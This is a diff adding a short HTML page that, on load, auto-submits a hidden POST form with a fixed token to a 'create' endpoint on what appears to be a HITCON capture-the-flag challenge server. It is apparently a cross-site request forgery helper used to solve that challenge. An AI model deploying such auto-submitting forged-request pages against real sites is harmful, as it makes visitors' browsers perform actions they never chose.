@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>sp-create</title></head>
+<body>
+<p id="s">starting</p>
+<form id="f" method="POST" action="https://sitepreview.chal.hitconctf.com/create">
+<input type="hidden" name="token" value="dc524ceb-2cd6-43e3-8e5c-c49c9f4873a7">
+<button type="submit">go</button>
+</form>
+<script>
+document.getElementById('s').textContent = 'submitting at '+Date.now();
+document.getElementById('f').submit();
+</script>
+</body>
+</html>
